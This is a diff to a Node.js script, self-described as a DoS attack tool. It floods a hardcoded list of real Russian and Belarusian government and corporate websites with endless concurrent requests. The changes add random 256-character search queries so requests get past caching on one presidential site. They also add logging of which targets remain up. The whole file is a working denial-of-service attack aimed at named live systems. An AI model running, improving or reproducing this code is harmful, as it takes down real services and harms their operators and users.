@@ -2,10 +2,11 @@ const axios = require('axios')
 const log = require('log4js').getLogger('dos-attack')
 
 axios.defaults.validateStatus = () => true
-log.level = "INFO"
+log.level = 'INFO'
 
 const LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS = 60
 const SITE_TIMEOUT_IN_MS = 2000
+const CHAR_SET = 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюяABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
 
 const targets = [
   'https://www.gazprom.ru/',
@@ -89,7 +90,7 @@ const targets = [
   'https://rec.gov.by/ru/',
   'https://www.mil.by/',
   'https://www.government.by/',
-  'https://president.gov.by/ru/',
+  'https://president.gov.by/ru/search_results?start=0&end=1646295523&query=_rand_str&match=any&order=asc',
   'https://www.mvd.gov.by/ru/',
   'https://www.kgb.by/ru/',
   'https://www.prokuratura.gov.by/',
@@ -199,6 +200,21 @@ function isDown (lastSuccessfulResponseTime) {
   return Math.abs(currentTime - lastSuccessfulResponseTime) > LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS * 1000
 }
 
+function randomString (len) {
+  let randomString = ''
+  for (let i = 0; i < len; i++) {
+    const randomPosition = Math.floor(Math.random() * CHAR_SET.length)
+    randomString += CHAR_SET.substring(randomPosition, randomPosition + 1)
+  }
+  return randomString
+}
+
+function prepareUrl (url) {
+  const preparedUrl = url.replace(/_rand_str/g, randomString(256))
+  log.debug(preparedUrl)
+  return preparedUrl
+}
+
 async function main () {
   log.info('Starting to DoS russian/belarusian gov sites')
 
@@ -209,17 +225,22 @@ async function main () {
   }, {})
 
   setInterval(() => {
-    const downSites = Object.values(requests).filter(r => isDown(r.lastSuccessfulResponseTime))
+    const downSites = []
+    const upSites = []
+    Object.entries(requests).forEach(([url, r]) => isDown(r.lastSuccessfulResponseTime) ? downSites.push(url) : upSites.push(url))
     log.info(`Total down sites: ${downSites.length}/${Object.keys(requests).length}`)
+    if (upSites.length !== 0 && upSites.length < 20) {
+      log.info(`Up site names: ${upSites.join(', ')}`)
+    }
     log.info(`Total request count: ${totalRequests}`)
-  }, 30000)
+  }, 10000)
 
   while (true) {
     const responses = await axios.all(Object.keys(requests).map(url => axios({
       method: 'get',
       timeout: SITE_TIMEOUT_IN_MS,
       headers: { 'User-Agent': Math.random().toString(34).slice(2) }, // random string 11 symbols length
-      url
+      url: prepareUrl(url)
     }).catch((e) => {
       requests[url].requests++
     })))
